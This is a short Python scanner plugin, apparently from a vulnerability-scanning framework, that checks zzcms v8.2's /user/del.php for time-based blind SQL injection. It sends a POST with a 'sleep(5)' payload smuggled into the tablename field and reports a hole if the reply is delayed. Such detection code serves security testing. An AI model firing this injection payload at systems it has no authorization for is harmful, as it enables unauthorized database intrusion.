#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Refer___ = http://www.freebuf.com/vuls/161888.html
import re
import time

def assign(service, arg):
    if service == 'zzcms':
        return True, arg
def audit(arg):
    payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'    #匹配用的字符串
    url = arg + "/user/del.php"
    startTime = time.time()
    post_data = "id=1&tablename=zzcms_answer where id = 1 and sleep(5)%23"

    code, head, html, redirect_url, log = hackhttp.http(url,headers={"Content-Type": "application/x-www-form-urlencoded"},post=post_data)

    if code == 200 and time.time() - startTime > 5:
        security_hole("zzcms v8.2 /user/del.php 存在SQL Inject descript:%s"%log["request"])

if __name__ == '__main__':
    from dummy import *